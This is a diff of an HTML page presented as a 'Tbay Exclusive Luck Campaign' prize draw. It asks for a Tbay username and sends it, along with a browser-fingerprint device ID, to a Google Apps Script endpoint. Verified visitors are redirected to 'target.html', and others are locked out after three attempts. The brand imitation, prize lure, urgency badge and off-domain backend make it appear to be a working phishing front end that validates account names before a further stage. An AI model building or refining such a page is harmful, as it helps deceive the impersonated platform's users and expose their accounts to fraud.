@@ -1,324 +1,500 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Tbay Exclusive Luck Campaign</title>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
-    
-    <style>
-        :root {
-            --tbay-primary: #00cccc;
-            --tbay-primary-deep: #009999;
-            --tbay-secondary: #003152;
-            --tbay-bg: #ffffff;
-            --card-bg: #ffffff;
-            --text-main: #003152;
-            --text-muted: #5c7285;
-            --error-red: #e11d48;
-            --error-bg: #fff5f5;
-            --gold-accent: #ffb900;
-        }
-        
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Plus Jakarta Sans", system-ui, sans-serif; }
-        html { -webkit-text-size-adjust: 100%; }
-        
-        body { 
-            background-color: var(--tbay-bg); 
-            background-image: 
-                radial-gradient(circle at 50% 50%, rgba(255,255,255,0.2) 0%, var(--tbay-bg) 100%),
-                repeating-conic-gradient(from 0deg at 50% 50%, 
-                    rgba(255,255,255,0) 0deg 15deg, 
-                    rgba(0, 204, 204, 0.02) 15deg 30deg,
-                    rgba(255,255,255,0) 30deg 45deg,
-                    rgba(0, 49, 82, 0.015) 45deg 60deg);
-            color: var(--text-main); 
-            min-height: 100vh; 
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            overflow-x: hidden;
-            -webkit-font-smoothing: antialiased;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Tbay Exclusive Gateway</title>
+  <style>
+    :root {
+      --tbay-primary: #00cccc;
+      --tbay-primary-deep: #009999;
+      --tbay-secondary: #003152;
+      --tbay-bg: #ffffff;
+      --text-main: #003152;
+      --text-muted: #5c7285;
+      --error-red: #e11d48;
+      --error-bg: #fff5f5;
+      --gold-accent: #ffb900;
+      --success-green: #2ecc71;
+      --input-bg: #f4f6f6;
+      --ambient-glow: rgba(0, 204, 204, 0.08);
+    }
 
-        .app-viewport {
-            width: 100%;
-            max-width: 440px;
-            min-height: 100vh;
-            position: relative;
-            padding: 0 18px 40px;
-        }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
 
-        .bar {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            padding: max(60px, calc(env(safe-area-inset-top) + 24px)) 2px 20px;
-            position: relative;
-            z-index: 15;
-        }
-        
-        .navback {
-            background: transparent; border: 0; margin: 0; padding: 4px; cursor: pointer; color: var(--tbay-secondary);
-            display: grid; place-items: center; line-height: 0; -webkit-tap-highlight-color: transparent;
-            position: relative; z-index: 16; transition: transform 0.1s ease;
-        }
-        .navback svg { width: 24px; height: 24px; display: block; }
-        .navback:active { opacity: 0.55; transform: scale(0.95); }
+    body {
+      background-color: var(--tbay-bg);
+      background-image: 
+        radial-gradient(circle at 50% 50%, rgba(255,255,255,0.1) 0%, var(--tbay-bg) 100%),
+        repeating-conic-gradient(from 0deg at 50% 50%, 
+            rgba(255,255,255,0) 0deg 15deg, 
+            rgba(0, 204, 204, 0.02) 15deg 30deg,
+            rgba(255,255,255,0) 30deg 45deg,
+            rgba(0, 49, 82, 0.015) 45deg 60deg);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      overflow-x: hidden;
+      position: relative;
+    }
 
-        .luck-graphics-stage {
-            position: absolute; inset: 0; z-index: 0; pointer-events: none; overflow: hidden;
-        }
-        .luck-element { position: absolute; opacity: 0.25; animation: luckFloat 6s ease-in-out infinite; }
-        
-        .luck-sparkle {
-            background: linear-gradient(135deg, var(--tbay-primary), var(--tbay-secondary));
-            clip-path: polygon(50% 0%, 63% 37%, 100% 50%, 63% 63%, 50% 100%, 37% 63%, 0% 50%, 37% 37%);
-        }
-        .sp-1 { width: 34px; height: 34px; top: 18%; left: 8%; }
-        .sp-2 { width: 22px; height: 22px; top: 45%; right: 6%; animation-delay: 1.5s; }
-        .sp-3 { width: 28px; height: 28px; bottom: 22%; left: 10%; animation-delay: 0.7s; }
+    body::before {
+      content: '';
+      position: absolute;
+      width: 350px;
+      height: 350px;
+      background: radial-gradient(circle, var(--ambient-glow) 0%, transparent 70%);
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 0;
+      pointer-events: none;
+    }
 
-        .luck-coin {
-            border-radius: 50%; background: linear-gradient(135deg, #ffffff, #e6fcfc);
-            border: 4px solid var(--tbay-primary); box-shadow: 0 4px 10px rgba(0, 204, 204, 0.2);
-            display: flex; align-items: center; justify-content: center;
-        }
-        .luck-coin::before { content: ''; width: 42%; height: 42%; border: 2px solid var(--tbay-primary); transform: rotate(45deg); }
-        .cn-1 { width: 44px; height: 44px; top: 28%; right: 8%; animation-duration: 7s; animation-delay: 0.5s; }
-        .cn-2 { width: 34px; height: 34px; top: 62%; left: 4%; animation-duration: 5s; animation-delay: 1.2s; }
+    .app-viewport {
+      width: 100%;
+      max-width: 440px;
+      min-height: 100vh;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      padding: max(60px, calc(env(safe-area-inset-top) + 24px)) 24px 20px 24px;
+      z-index: 2;
+    }
 
-        .luck-confetti { width: 14px; height: 14px; background: var(--gold-accent); transform: rotate(45deg); opacity: 0.2; }
-        .cf-1 { top: 52%; left: 14%; animation-duration: 4s; }
-        .cf-2 { top: 74%; right: 12%; animation-duration: 5.5s; animation-delay: 0.3s; }
+    .decorations-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      pointer-events: none;
+      z-index: 1;
+    }
 
-        .app-card-platform { 
-            width: 100%; 
-            background: rgba(255, 255, 255, 0.96); 
-            backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
-            border-radius: 32px; 
-            border: 3px solid #ffffff;
-            box-shadow: 
-                inset 0 -8px 0px rgba(0, 49, 82, 0.03),
-                0 20px 50px rgba(0, 49, 82, 0.06);
-            padding: 3.5rem 2rem 3rem 2rem; 
-            position: relative; z-index: 2;
-            animation: cardEntrance 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
+    .floating-asset {
+      position: absolute;
+      animation: luckFloat 7s ease-in-out infinite alternate;
+    }
 
-        .attempts-floating-tag {
-            position: absolute; top: -14px; left: 50%; transform: translateX(-50%);
-            color: #ffffff; background: var(--tbay-secondary); padding: 6px 20px;
-            border-radius: 999px; font-size: 0.85rem; font-weight: 800; letter-spacing: 0.5px;
-            text-transform: uppercase; border: 2px solid #ffffff;
-            box-shadow: 0 6px 16px rgba(0, 49, 82, 0.15); white-space: nowrap;
-            z-index: 10; transition: all 0.3s ease;
-        }
-        .attempts-floating-tag.warning { background: var(--error-red); box-shadow: 0 6px 16px rgba(225, 29, 72, 0.25); }
+    .sparkle-asset {
+      position: absolute;
+      animation: sparkleBlink 2.5s linear infinite alternate;
+    }
 
-        .display-header-title { 
-            font-family: "Archivo", sans-serif; text-align: center; font-size: 2.2rem; 
-            font-weight: 900; margin-bottom: 2rem; line-height: 1.15; letter-spacing: -0.02em; color: var(--tbay-secondary); 
-        }
-        .display-header-title span { color: var(--tbay-primary-deep); }
-        
-        .form-interaction-layer { display: flex; flex-direction: column; gap: 1.5rem; }
-        
-        input[type="text"] { 
-            width: 100%; padding: 1.2rem 1.5rem; background: #f4f7f6; border: 2px solid transparent; 
-            border-radius: 18px; font-size: 1.1rem; color: var(--text-main); outline: none; transition: all 0.25s ease; font-weight: 700; text-align: center; 
-        }
-        input[type="text"]:focus { border-color: var(--tbay-primary); box-shadow: 0 0 16px rgba(0, 204, 204, 0.15); background: #ffffff; }
-        input[type="text"]::placeholder { color: rgba(0, 49, 82, 0.3); font-weight: 600; }
-        
-        .action-button { 
-            width: 100%; padding: 1.15rem; background: linear-gradient(135deg, var(--tbay-primary), var(--tbay-primary-deep)); 
-            color: var(--tbay-secondary); border: none; border-radius: 18px; font-family: "Archivo", sans-serif;
-            font-size: 1.15rem; font-weight: 800; cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
-            box-shadow: 0 8px 24px rgba(0, 204, 204, 0.3); text-transform: uppercase; letter-spacing: 0.5px; text-decoration: none; display: block; text-align: center; 
-        }
-        .action-button:hover { background: linear-gradient(135deg, var(--tbay-secondary), #001f36); color: #ffffff; transform: translateY(-2px); box-shadow: 0 12px 28px rgba(0, 49, 82, 0.2); }
-        .action-button:disabled { background: #e2e8f0; color: #94a3b8; box-shadow: none; cursor: not-allowed; transform: none; }
-        
-        /* Optimized Space & Typography For Error Alert Bar */
-        .error-alert-bar { 
-            background: var(--error-bg); border: 1px solid rgba(225, 29, 72, 0.15); color: var(--error-red); 
-            padding: 0.8rem 1rem; border-radius: 16px; font-size: 0.82rem; text-align: center; 
-            display: none; font-weight: 700; line-height: 1.45; animation: errorShake 0.4s linear; 
-        }
-        
-        .rules-card-platform { 
-            width: 100%; background: #ffffff; border-radius: 24px; border: 1px solid rgba(0, 49, 82, 0.08); 
-            box-shadow: 0 10px 30px rgba(0, 49, 82, 0.03); padding: 1.75rem; margin-top: 1.25rem; position: relative; z-index: 2; 
-            animation: cardEntrance 0.5s cubic-bezier(0.16, 1, 0.3, 1) 0.1s both; 
-        }
-        .rules-card-title { font-family: "Archivo", sans-serif; font-size: 0.9rem; font-weight: 800; color: var(--tbay-secondary); margin-bottom: 0.75rem; text-transform: uppercase; letter-spacing: 0.8px; }
-        .rules-card-platform ul { list-style: none; font-size: 0.82rem; color: var(--text-muted); line-height: 1.6; }
-        .rules-card-platform li { margin-bottom: 0.6rem; position: relative; padding-left: 1.25rem; font-weight: 500; }
-        .rules-card-platform li::before { content: '✓'; position: absolute; left: 0; color: var(--tbay-primary-deep); font-weight: bold; }
-        
-        .lockout-view-panel { 
-            display: none; width: 100%; text-align: center; animation: cardEntrance 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; 
-            background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); 
-            border-radius: 32px; border: 3px solid #ffffff; box-shadow: 0 20px 50px rgba(0, 49, 82, 0.06); padding: 3.5rem 2rem; position: relative; z-index: 2; 
-        }
-        .lockout-message { font-size: 1.05rem; line-height: 1.6; color: var(--tbay-secondary); font-weight: 600; margin-bottom: 2rem; }
-        
-        @keyframes luckFloat { 0%, 100% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-15px) rotate(8deg); } }
-        @keyframes cardEntrance { 0% { transform: translateY(24px); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
-        @keyframes errorShake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-6px); } 40%, 80% { transform: translateX(6px); } }
-        @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
-    </style>
+    .coin-element {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ffe066 0%, var(--gold-accent) 50%, #d49a00 100%);
+      box-shadow: inset -2px -2px 4px rgba(0,0,0,0.2), inset 2px 2px 4px rgba(255,255,255,0.4), 0 4px 12px rgba(212,154,0,0.15);
+    }
+
+    @keyframes luckFloat {
+      0% { transform: translateY(0px) rotate(0deg) scale(1); }
+      100% { transform: translateY(-30px) rotate(25deg) scale(1.08); }
+    }
+
+    @keyframes sparkleBlink {
+      0%, 100% { opacity: 0.2; transform: scale(0.8); }
+      50% { opacity: 1; transform: scale(1.2); }
+    }
+
+    .navigation-notch-bar {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      z-index: 10;
+    }
+
+    .nav-arrow-back {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(0, 49, 82, 0.06);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: var(--tbay-secondary);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+      transition: all 0.2s ease;
+    }
+
+    .portal-main-card {
+      background: transparent;
+      position: relative;
+      z-index: 5;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      animation: cardEntrance 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+
+    @keyframes cardEntrance {
+      0% { opacity: 0; transform: translateY(20px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .attempt-pill-badge {
+      position: absolute;
+      top: -36px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--tbay-secondary);
+      color: #ffffff;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      box-shadow: 0 4px 12px rgba(0, 49, 82, 0.12);
+    }
+
+    .attempt-pill-badge.warning-state {
+      background: var(--error-red);
+      box-shadow: 0 4px 12px rgba(225, 29, 72, 0.25);
+    }
+
+    .header-group {
+      text-align: center;
+      margin-bottom: 45px;
+      margin-top: 15px;
+    }
+
+    .header-group h1 {
+      font-size: 2.45rem;
+      font-weight: 800;
+      color: var(--text-main);
+      line-height: 1.15;
+      letter-spacing: -0.03em;
+    }
+
+    .header-group h1 .teal-accent {
+      background: linear-gradient(135deg, var(--tbay-primary) 0%, #00acac 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+    }
+
+    /* Core Form Stack */
+    .input-form-wrapper {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      width: 100%;
+    }
+
+    .input-glow-container {
+      position: relative;
+      width: 100%;
+    }
+
+    .text-input-field {
+      width: 100%;
+      padding: 22px 24px;
+      border-radius: 24px;
+      border: 2px solid transparent;
+      background-color: var(--input-bg);
+      font-size: 1.2rem;
+      font-weight: 700;
+      text-align: center;
+      color: var(--text-main);
+      outline: none;
+      box-shadow: inset 0 2px 4px rgba(0, 49, 82, 0.02);
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .text-input-field:focus {
+      background-color: #ffffff;
+      border-color: var(--tbay-primary);
+      box-shadow: 0 10px 30px rgba(0, 204, 204, 0.08), 0 0 0 5px rgba(0, 204, 204, 0.12);
+    }
+
+    .submit-action-btn {
+      width: 100%;
+      padding: 22px;
+      border-radius: 24px;
+      border: none;
+      background: linear-gradient(135deg, var(--tbay-primary) 0%, #00e6e6 100%);
+      color: var(--tbay-secondary);
+      font-size: 1.15rem;
+      font-weight: 800;
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 24px rgba(0, 204, 204, 0.25);
+      animation: buttonPulse 2.5s infinite;
+      transition: all 0.2s ease;
+    }
+
+    @keyframes buttonPulse {
+      0% { box-shadow: 0 8px 24px rgba(0, 204, 204, 0.25), 0 0 0 0px rgba(0, 204, 204, 0.3); }
+      70% { box-shadow: 0 12px 28px rgba(0, 204, 204, 0.35), 0 0 0 14px rgba(0, 204, 204, 0); }
+      100% { box-shadow: 0 8px 24px rgba(0, 204, 204, 0.25), 0 0 0 0px rgba(0, 204, 204, 0); }
+    }
+
+    .submit-action-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      animation: none;
+    }
+
+    /* Guaranteed Layout Protection: Absolute placement sequencing underneath the button flow */
+    .system-error-ribbon {
+      display: none;
+      background: var(--error-bg);
+      border: 1px solid rgba(225, 29, 72, 0.12);
+      border-radius: 16px;
+      padding: 12px 16px;
+      color: var(--error-red);
+      font-size: 0.82rem; /* Perfect micro-profile layout size execution */
+      line-height: 1.4;
+      text-align: center;
+      font-weight: 600;
+    }
+
+    .system-error-ribbon.active {
+      display: block;
+      animation: errorShake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+    }
+
+    @keyframes errorShake {
+      10%, 90% { transform: translate3d(-1px, 0, 0); }
+      20%, 80% { transform: translate3d(2px, 0, 0); }
+      30%, 50%, 70% { transform: translate3d(-3px, 0, 0); }
+      40%, 60% { transform: translate3d(3px, 0, 0); }
+    }
+
+    .lockout-layout-wrapper {
+      display: none;
+      text-align: center;
+      background: #ffffff;
+      padding: 44px 24px;
+      border-radius: 32px;
+      box-shadow: 0 20px 50px rgba(0, 49, 82, 0.05);
+      border: 1px solid rgba(0, 49, 82, 0.04);
+    }
+
+    .lockout-layout-wrapper h2 {
+      font-size: 1.45rem;
+      color: var(--tbay-secondary);
+      margin-bottom: 12px;
+      font-weight: 800;
+    }
+
+    .lockout-layout-wrapper p {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      line-height: 1.55;
+      margin-bottom: 32px;
+    }
+
+    .close-system-btn {
+      width: 100%;
+      padding: 18px;
+      border-radius: 18px;
+      border: 1px solid rgba(0, 49, 82, 0.12);
+      background: #ffffff;
+      color: var(--tbay-secondary);
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="app-viewport">
-        <div class="luck-graphics-stage">
-            <div class="luck-element luck-sparkle sp-1"></div>
-            <div class="luck-element luck-sparkle sp-2"></div>
-            <div class="luck-element luck-sparkle sp-3"></div>
-            <div class="luck-element luck-coin cn-1"></div>
-            <div class="luck-element luck-coin cn-2"></div>
-            <div class="luck-element luck-confetti cf-1"></div>
-            <div class="luck-element luck-confetti cf-2"></div>
-        </div>
+  <div class="decorations-container">
+    <div class="floating-asset coin-element" style="top: 14%; left: 5%;"></div>
+    <div class="floating-asset coin-element" style="top: 68%; right: -6%; animation-delay: -3.5s; width: 24px; height: 24px;"></div>
+    <svg class="sparkle-asset" style="top: 25%; right: 10%; width: 20px; height: 20px;" viewBox="0 0 24 24" fill="none"><path d="M12 2L14.8 9.2L22 12L14.8 14.8L12 22L9.2 14.8L2 12L9.2 9.2L12 2Z" fill="var(--tbay-primary)"/></svg>
+    <svg class="sparkle-asset" style="top: 55%; left: 8%; width: 16px; height: 16px; animation-delay: -1.2s;" viewBox="0 0 24 24" fill="none"><path d="M12 2L14.8 9.2L22 12L14.8 14.8L12 22L9.2 14.8L2 12L9.2 9.2L12 2Z" fill="var(--gold-accent)"/></svg>
+  </div>
 
-        <div class="bar">
-            <button class="navback" type="button" onclick="history.back()" aria-label="Go back">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-                    <polyline points="15 18 9 12 15 6"></polyline>
-                </svg>
-            </button>
-        </div>
-
-        <div class="app-card-platform" id="main-card">
-            <div class="attempts-floating-tag" id="attempts-badge">3 Attempts Left</div>
-            <div class="form-interaction-layer" id="input-view">
-                <h1 class="display-header-title">Enter Tbay username to <span>participate.</span></h1>
-                <input type="text" id="username" placeholder="Username" autocomplete="off" spellcheck="false">
-                <button id="submit-btn" class="action-button" onclick="processClaim()">Try My Luck</button>
-                <div class="error-alert-bar" id="error-box"></div>
-            </div>
-        </div>
-
-        <div class="lockout-view-panel" id="lockout-view">
-            <div class="lockout-message">
-                👋 It looks like we couldn't verify your Tbay username after 3 attempts, so this specific campaign has drawn to a close.<br><br>But please don't go far! We love having you with us, and our team is already working on brand-new, exciting surprises just for you. Bigger things are coming your way soon! 💙
-            </div>
-            <button class="action-button" onclick="history.back()">Close</button>
-        </div>
-
-        <div class="rules-card-platform" id="rules-box">
-            <div class="rules-card-title">📋 Campaign Guidelines</div>
-            <ul>
-                <li>This program is available exclusively for selected users invited through the banner displayed on the Tbay application homepage.</li>
-                <li>Eligible users are permitted exactly <strong>one unique campaign entry claim</strong> during the active event window.</li>
-                <li>Each user has a maximum limit of <strong>3 attempts</strong> to successfully verify their corresponding app username.</li>
-                <li>Your entry counts are saved securely within the storage layer. Refreshing or exiting the webview interface context will not replenish spent validation attempts.</li>
-                <li><strong>Event Duration:</strong> July 1, 2026 – July 31, 2026 (GMT+1).</li>
-            </ul>
-        </div>
+  <div class="app-viewport">
+    
+    <div class="navigation-notch-bar">
+      <div class="nav-arrow-back" id="backArrowBtn" aria-label="Return Navigation">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      </div>
+      <div></div>
     </div>
 
-    <script>
-        const BACKEND_API_URL = "https://script.google.com/macros/s/AKfycbyGM5u08oekxwYHItPoZah2t7_ZQQlnkyYkc7v1exvCIE8H_aYeWA0GhpfzEgUc0t2Vog/exec";
-        const MAX_CHANCES = 3;
+    <div class="portal-main-card" id="mainCardNode">
+      
+      <div id="stateAContainer">
+        <div class="attempt-pill-badge" id="attemptBadge">3 Attempts Left</div>
+        
+        <div class="header-group">
+          <h1>Enter Tbay<br>username to<br><span class="teal-accent">participate.</span></h1>
+        </div>
 
-        const KEY_ATTEMPTS = 'tbay_campaign_remaining_attempts';
-        const KEY_DEVICE = 'tbay_campaign_device_token';
-        const KEY_VERIFIED = 'tbay_campaign_verified';
+        <div class="input-form-wrapper">
+          <div class="input-glow-container">
+            <input type="text" class="text-input-field" id="usernameInput" placeholder="username" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false">
+          </div>
+          
+          <button class="submit-action-btn" id="submitBtn">Try My Luck</button>
 
-        if (localStorage.getItem(KEY_ATTEMPTS) === null) {
-            localStorage.setItem(KEY_ATTEMPTS, MAX_CHANCES.toString());
-        }
+          <div class="system-error-ribbon" id="errorRibbon"></div>
+        </div>
+      </div>
 
-        function getDeviceID() {
-            let id = localStorage.getItem(KEY_DEVICE);
-            if (!id) {
-                id = 'tby_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
-                localStorage.setItem(KEY_DEVICE, id);
-            }
-            return id;
-        }
+      <div id="stateBContainer" class="lockout-layout-wrapper">
+        <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="var(--tbay-primary)" stroke-width="1.5" style="margin-bottom: 20px;"><path stroke-linecap="round" stroke-linejoin="round" d="M21 8.25c0-2.485-2.099-4.5-4.688-4.5-1.935 0-3.597 1.126-4.312 2.733-.715-1.607-2.377-2.733-4.313-2.733C5.1 3.75 3 5.765 3 8.25c0 7.22 9 12 9 12s9-4.78 9-12z" /></svg>
+        <h2>Thank you for being part of the platform.</h2>
+        <p>Exclusive campaigns are currently being designed for you. Check back soon for subsequent updates.</p>
+        <button class="close-system-btn" id="closeBtn">Close</button>
+      </div>
 
-        window.addEventListener('DOMContentLoaded', () => {
-            if (localStorage.getItem(KEY_VERIFIED) === 'true') {
-                window.location.href = "target.html";
-                return;
-            }
+    </div>
+  </div>
 
-            if (parseInt(localStorage.getItem(KEY_ATTEMPTS), 10) <= 0) {
-                renderLockoutView();
+  <script>
+    const DEPLOYMENT_ENDPOINT = "https://script.google.com/macros/s/AKfycbyGM5u08oekxwYHItPoZah2t7_ZQQlnkyYkc7v1exvCIE8H_aYeWA0GhpfzEgUc0t2Vog/exec";
+
+    function generateDeviceSignature() {
+      let keys = [
+        navigator.userAgent,
+        navigator.language,
+        screen.colorDepth,
+        screen.width + 'x' + screen.height,
+        new Date().getTimezoneOffset(),
+        !!window.sessionStorage,
+        !!window.localStorage
+      ];
+      let str = keys.join('||');
+      let hash = 0;
+      for (let i = 0; i < str.length; i++) {
+        let char = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+      }
+      return 'TBAY-' + Math.abs(hash).toString(16).toUpperCase();
+    }
+
+    const deviceId = generateDeviceSignature();
+    
+    const stateA = document.getElementById('stateAContainer');
+    const stateB = document.getElementById('stateBContainer');
+    const attemptBadge = document.getElementById('attemptBadge');
+    const usernameInput = document.getElementById('usernameInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const errorRibbon = document.getElementById('errorRibbon');
+    const backArrowBtn = document.getElementById('backArrowBtn');
+    const closeBtn = document.getElementById('closeBtn');
+
+    function initApp() {
+      if (localStorage.getItem('tbay_lockout') === 'true') {
+        renderLockoutState();
+        return;
+      }
+      
+      let attempts = localStorage.getItem('tbay_remaining_attempts');
+      if (attempts === null) {
+        localStorage.setItem('tbay_remaining_attempts', '3');
+        attempts = 3;
+      } else {
+        attempts = parseInt(attempts);
+      }
+      
+      updateBadgeUI(attempts);
+      
+      if (attempts <= 0) {
+        renderLockoutState();
+      }
+    }
+
+    function updateBadgeUI(count) {
+      attemptBadge.textContent = `${count} ${count === 1 ? 'Attempt' : 'Attempts'} Left`;
+      if (count <= 1) {
+        attemptBadge.classList.add('warning-state');
+      } else {
+        attemptBadge.classList.remove('warning-state');
+      }
+    }
+
+    function renderLockoutState() {
+      localStorage.setItem('tbay_lockout', 'true');
+      stateA.style.display = 'none';
+      stateB.style.display = 'block';
+    }
+
+    // Handles validation, missing fields, or network issues persistently beneath the CTA button
+    function showError(msg) {
+      errorRibbon.textContent = msg;
+      errorRibbon.classList.remove('active');
+      void errorRibbon.offsetWidth; // Force CSS repaint matrix to re-trigger lateral shake clean
+      errorRibbon.classList.add('active');
+    }
+
+    submitBtn.addEventListener('click', async () => {
+      const userVal = usernameInput.value.trim();
+      if (!userVal) {
+        showError("Profile username identity field cannot be empty.");
+        return;
+      }
+
+      errorRibbon.classList.remove('active');
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Verifying...";
+
+      let currentAttempts = parseInt(localStorage.getItem('tbay_remaining_attempts') || '3');
+
+      try {
+        const url = `${DEPLOYMENT_ENDPOINT}?action=verifyUser&username=${encodeURIComponent(userVal)}&deviceId=${encodeURIComponent(deviceId)}`;
+        const response = await fetch(url, { method: 'GET', mode: 'cors' });
+        const data = await response.json();
+
+        if (data.success) {
+          localStorage.setItem('tbay_verified_device', deviceId);
+          window.location.href = 'target.html';
+        } else {
+          if (data.lockout === true) {
+            localStorage.setItem('tbay_remaining_attempts', '0');
+            renderLockoutState();
+          } else {
+            let nextAttempts = data.attemptsRemaining !== undefined ? data.attemptsRemaining : (currentAttempts - 1);
+            localStorage.setItem('tbay_remaining_attempts', nextAttempts.toString());
+            updateBadgeUI(nextAttempts);
+            
+            if (nextAttempts <= 0) {
+              renderLockoutState();
             } else {
-                renderAttemptsCounter();
+              showError(data.message || "Something went wrong on our end and we will fix it soon. Please try again later.");
             }
-        });
-
-        function renderAttemptsCounter() {
-            const chancesLeft = parseInt(localStorage.getItem(KEY_ATTEMPTS), 10);
-            const badgeDisplay = document.getElementById('attempts-badge');
-
-            badgeDisplay.classList.remove('warning');
-            if (chancesLeft === 1) {
-                badgeDisplay.innerText = "1 Attempt Left!";
-                badgeDisplay.classList.add('warning');
-            } else {
-                badgeDisplay.innerText = `${chancesLeft} Attempts Left`;
-            }
+          }
         }
-
-        function renderLockoutView() {
-            document.getElementById('main-card').style.display = "none";
-            document.getElementById('rules-box').style.display = "none";
-            document.getElementById('lockout-view').style.display = "block";
+      } catch (err) {
+        showError("Something went wrong on our end and we will fix it soon. Please try again later.");
+      } finally {
+        if (localStorage.getItem('tbay_lockout') !== 'true') {
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Try My Luck";
         }
+      }
+    });
 
-        function processClaim() {
-            const usernameInput = document.getElementById('username').value.trim();
-            const errorBox = document.getElementById('error-box');
-            const submitBtn = document.getElementById('submit-btn');
-            let chancesLeft = parseInt(localStorage.getItem(KEY_ATTEMPTS), 10);
+    backArrowBtn.addEventListener('click', () => history.back());
+    closeBtn.addEventListener('click', () => history.back());
 
-            if (chancesLeft <= 0) return;
-
-            if (!usernameInput) {
-                errorBox.style.animation = 'none'; errorBox.offsetHeight; errorBox.style.animation = null;
-                errorBox.innerText = "Please enter your Tbay account username to proceed.";
-                errorBox.style.display = "block"; return;
-            }
-
-            errorBox.style.display = "none"; submitBtn.innerText = "Verifying..."; submitBtn.disabled = true;
-            const deviceId = getDeviceID();
-            const url = `${BACKEND_API_URL}?action=verifyUser&username=${encodeURIComponent(usernameInput)}&deviceId=${deviceId}`;
-
-            fetch(url)
-                .then(res => res.json())
-                .then(data => {
-                    if (data.success) {
-                        localStorage.setItem(KEY_VERIFIED, 'true');
-                        window.location.href = "target.html";
-                    } else {
-                        chancesLeft--; localStorage.setItem(KEY_ATTEMPTS, chancesLeft.toString());
-                        submitBtn.disabled = false; submitBtn.innerText = "Try My Luck";
-                        
-                        if (chancesLeft <= 0) {
-                            renderLockoutView();
-                        } else {
-                            renderAttemptsCounter();
-                            errorBox.style.animation = 'none'; errorBox.offsetHeight; errorBox.style.animation = null;
-                            errorBox.innerText = `❌ ${data.message}`; errorBox.style.display = "block";
-                        }
-                    }
-                })
-                .catch(err => {
-                    console.error(err); submitBtn.disabled = false; submitBtn.innerText = "Try My Luck";
-                    errorBox.innerText = "Something went wrong on our end and we will fix it soon. Please try again later.";
-                    errorBox.style.display = "block";
-                });
-        }
-    </script>
+    window.addEventListener('DOMContentLoaded', initApp);
+  </script>
 </body>
 </html>
